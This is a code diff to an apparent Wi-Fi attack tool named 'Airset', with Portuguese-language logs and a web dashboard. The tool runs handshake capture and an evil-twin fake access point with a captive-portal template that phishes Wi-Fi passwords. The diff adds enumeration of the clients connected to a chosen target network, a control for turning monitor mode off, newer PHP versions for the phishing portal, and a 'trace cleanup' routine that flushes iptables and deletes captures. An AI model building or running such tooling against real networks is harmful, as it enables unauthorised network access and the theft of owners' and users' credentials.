@@ -56,6 +56,8 @@ STATE = {
     "ap_iface": None,         # interface serving the fake AP
     "targets": [],            # scanned APs
     "target": None,           # selected AP {bssid, channel, essid, power, enc}
+    "target_clients": [],     # stations associated to the selected AP
+    "scanning_clients": False,# a targeted client scan is running
     "handshake": None,        # path to captured .cap
     "template": None,         # captive-portal template name
     "clients": 0,
@@ -161,6 +163,23 @@ def stop_monitor(mon):
         run(["airmon-ng", "stop", mon])
 
 
+def stop_monitor_web():
+    """Bring the monitor interface down and hand the radio back to NetworkManager."""
+    mon = STATE["monitor"]
+    if not mon:
+        log("! nenhum monitor ativo")
+        return
+    # a capture running on the monitor iface must stop first
+    stop_capture()
+    kill("cscan")
+    stop_monitor(mon)
+    run(["systemctl", "restart", "NetworkManager"])
+    with _LOCK:
+        STATE.update(monitor=None, target_clients=[], scanning_clients=False)
+        STATE["phase"] = "scanned" if STATE["targets"] else "idle"
+    log(f"monitor {mon} desabilitado — interface restaurada")
+
+
 # ── scan ────────────────────────────────────────────────────────────────────
 def parse_scan_csv(path):
     targets = []
@@ -193,6 +212,66 @@ def parse_scan_csv(path):
             return -999
     targets.sort(key=pw, reverse=True)
     return targets
+
+
+def parse_stations_csv(path, bssid):
+    """Return the stations (clients) associated to `bssid` from an airodump CSV."""
+    clients = []
+    try:
+        text = Path(path).read_text(errors="ignore")
+    except OSError:
+        return clients
+    if "Station MAC" not in text:
+        return clients
+    st_block = text.split("Station MAC", 1)[1].strip().splitlines()
+    reader = csv.reader(st_block)
+    for row in reader:
+        if len(row) < 6:
+            continue
+        mac = row[0].strip()
+        if not re.match(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$", mac):
+            continue
+        assoc = row[5].strip()
+        if assoc.lower() != bssid.lower():
+            continue
+        clients.append({
+            "mac": mac,
+            "power": row[3].strip(),
+            "packets": row[4].strip(),
+        })
+    return clients
+
+
+def do_scan_clients(seconds=10):
+    """Short targeted airodump on the selected AP to list connected clients."""
+    mon, t = STATE["monitor"], STATE["target"]
+    if not mon or not t:
+        return
+    # don't fight an ongoing handshake capture / attack for the radio
+    if STATE["phase"] in ("capturing", "attacking"):
+        log("! scan de clientes indisponível durante captura/ataque")
+        return
+    with _LOCK:
+        STATE["scanning_clients"] = True
+    bssid, chan = t["bssid"], t["channel"]
+    prefix = DUMP_PATH / ("cscan-" + bssid.replace(":", ""))
+    for f in glob.glob(str(prefix) + "*"):
+        try:
+            os.remove(f)
+        except OSError:
+            pass
+    spawn("cscan", ["airodump-ng", "--bssid", bssid, "-c", chan, "-w", str(prefix),
+                    "--output-format", "csv", "--ignore-negative-one", mon])
+    time.sleep(seconds)
+    kill("cscan")
+    csvs = sorted(glob.glob(str(prefix) + "-*.csv"))
+    clients = parse_stations_csv(csvs[-1], bssid) if csvs else []
+    with _LOCK:
+        # only publish if the user hasn't switched targets meanwhile
+        if STATE["target"] and STATE["target"]["bssid"] == bssid:
+            STATE["target_clients"] = clients
+        STATE["scanning_clients"] = False
+    log(f"clientes de {t['essid']}: {len(clients)}")
 
 
 def do_scan(seconds=12):
@@ -275,7 +354,7 @@ def stop_capture():
 
 # ── fake AP + captive portal ────────────────────────────────────────────────
 def php_cgi_bin():
-    for b in ("php8.2-cgi", "php8.1-cgi", "php-cgi"):
+    for b in ("php8.4-cgi", "php8.3-cgi", "php8.2-cgi", "php8.1-cgi", "php-cgi"):
         p = shutil.which(b)
         if p:
             return p
@@ -490,15 +569,49 @@ def stop_attack():
 
 
 def full_cleanup():
+    log("[-] Limpando rastros e restaurando interface...")
     stop_attack()
     stop_capture()
-    if STATE["monitor"]:
-        stop_monitor(STATE["monitor"])
+    kill("cscan")
+    killall_tools()
+
+    mon = STATE["monitor"]
+    base = STATE["iface"]
+    if mon:
+        log(f"[-] Desabilitando interface de monitoramento {mon}")
+        stop_monitor(mon)
+
+    log("[-] Limpando iptables")
+    for args in (["--flush"], ["--table", "nat", "--flush"],
+                 ["--delete-chain"], ["--table", "nat", "--delete-chain"]):
+        run(["iptables"] + args)
+    for chain in ("INPUT", "FORWARD", "OUTPUT"):
+        run(["iptables", "-P", chain, "ACCEPT"])
+    run(["sysctl", "-w", "net.ipv4.ip_forward=0"])
+
+    # bring the base radio back to a clean managed state
+    if base:
+        log(f"[-] Restaurando interface {base}")
+        run(["ip", "addr", "flush", "dev", base])
+        run(["ip", "link", "set", base, "down"])
+        run(["iw", base, "set", "type", "managed"])
+        run(["ip", "link", "set", base, "up"])
+
+    log("[-] Removendo arquivos temporários")
+    try:
+        shutil.rmtree(DUMP_PATH, ignore_errors=True)
+        DUMP_PATH.mkdir(parents=True, exist_ok=True)
+    except OSError:
+        pass
+
+    log("[-] Reiniciando NetworkManager")
     run(["systemctl", "restart", "NetworkManager"])
+
     with _LOCK:
         STATE.update(phase="idle", monitor=None, iface=None, ap_iface=None,
-                     targets=[], target=None, handshake=None, clients=0)
-    log("limpeza completa")
+                     targets=[], target=None, target_clients=[],
+                     scanning_clients=False, handshake=None, clients=0)
+    log("[+] Limpeza concluída — interface restaurada. Obrigado por usar o Airset")
 
 
 def available_templates():
@@ -583,6 +696,7 @@ tr.sel{background:rgba(0,255,136,.08)}tr:hover{background:rgba(255,255,255,.03);
         <div><label>Interface Wi-Fi</label>
           <select id="iface"></select></div>
         <div style="flex:0 0 auto"><button class="btn g" onclick="startMon()">Monitor ON</button></div>
+        <div style="flex:0 0 auto"><button class="btn r" onclick="act('monitor_stop')">Monitor OFF</button></div>
       </div>
       <p class="sub" id="monInfo"></p>
     </div>
@@ -596,6 +710,17 @@ tr.sel{background:rgba(0,255,136,.08)}tr:hover{background:rgba(255,255,255,.03);
       <div style="max-height:220px;overflow:auto;margin-top:10px">
       <table><thead><tr><th>SSID</th><th>BSSID</th><th>Ch</th><th>Pwr</th><th>Enc</th></tr></thead>
       <tbody id="targets"></tbody></table></div>
+    </div>
+
+    <div class="card" style="margin-top:14px">
+      <h2>Clientes do alvo</h2>
+      <div class="row">
+        <div class="sub" id="cliInfo" style="align-self:center">Selecione um alvo para listar os dispositivos conectados.</div>
+        <div style="flex:0 0 auto"><button class="btn" id="cliBtn" onclick="act('clients')">Atualizar</button></div>
+      </div>
+      <div style="max-height:180px;overflow:auto;margin-top:10px">
+      <table><thead><tr><th>MAC do cliente</th><th>Pwr</th><th>Pacotes</th></tr></thead>
+      <tbody id="clientsTbl"></tbody></table></div>
     </div>
 
     <div class="card" style="margin-top:14px">
@@ -658,6 +783,10 @@ async function load(){const s=await api("/api/state");
    tr.innerHTML=`<td>${t.essid}</td><td>${t.bssid}</td><td>${t.channel}</td><td>${t.power}</td><td>${t.enc}</td>`;
    tr.onclick=()=>{SEL=t.bssid;api("/api/target","POST",{bssid:t.bssid});load()};tb.appendChild(tr)});
  if(s.target){SEL=s.target.bssid;document.getElementById("tgtBox").innerHTML=`Alvo: <b style="color:var(--cyan)">${s.target.essid}</b> · ${s.target.bssid} · ch ${s.target.channel}`}
+ const ct=document.getElementById("clientsTbl");ct.innerHTML="";
+ (s.target_clients||[]).forEach(c=>{const tr=document.createElement("tr");tr.innerHTML=`<td>${c.mac}</td><td>${c.power}</td><td>${c.packets}</td>`;ct.appendChild(tr)});
+ const cliBtn=document.getElementById("cliBtn");cliBtn.disabled=!s.target||s.scanning_clients;
+ document.getElementById("cliInfo").textContent=!s.target?"Selecione um alvo para listar os dispositivos conectados.":(s.scanning_clients?"Procurando clientes...":`${(s.target_clients||[]).length} cliente(s) conectado(s)`);
  document.getElementById("hsInfo").textContent=s.handshake?("handshake: "+s.handshake):"Selecione um alvo e capture.";
  document.getElementById("clients").textContent=s.clients;
  document.getElementById("attempts").textContent=s.attempts;
@@ -727,9 +856,16 @@ class Handler(BaseHTTPRequestHandler):
             bg(_m)
         elif path == "/api/scan":
             bg(do_scan, int(b.get("seconds", 12)))
+        elif path == "/api/monitor_stop":
+            bg(stop_monitor_web)
         elif path == "/api/target":
             with _LOCK:
                 STATE["target"] = next((t for t in STATE["targets"] if t["bssid"] == b.get("bssid")), None)
+                STATE["target_clients"] = []
+            if STATE["target"]:
+                bg(do_scan_clients, int(b.get("client_secs", 10)))
+        elif path == "/api/clients":
+            bg(do_scan_clients, int(b.get("seconds", 10)))
         elif path == "/api/capture":
             bg(do_capture)
         elif path == "/api/capture_stop":
